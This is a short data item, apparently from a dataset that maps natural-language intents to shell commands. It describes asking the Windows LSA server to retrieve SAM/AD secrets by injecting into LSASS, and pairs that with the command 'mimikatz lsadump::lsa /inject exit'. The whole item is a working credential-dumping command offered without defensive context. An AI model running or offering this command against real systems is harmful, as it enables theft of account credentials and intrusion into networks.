# Natural language intent:
# Ask LSA Server to retrieve SAM/AD enterprise (normal, patch on the fly or inject). Use /patch for a subset of data, use /inject for everything. Inject LSASS to extract credentials.

mimikatz lsadump::lsa /inject exit
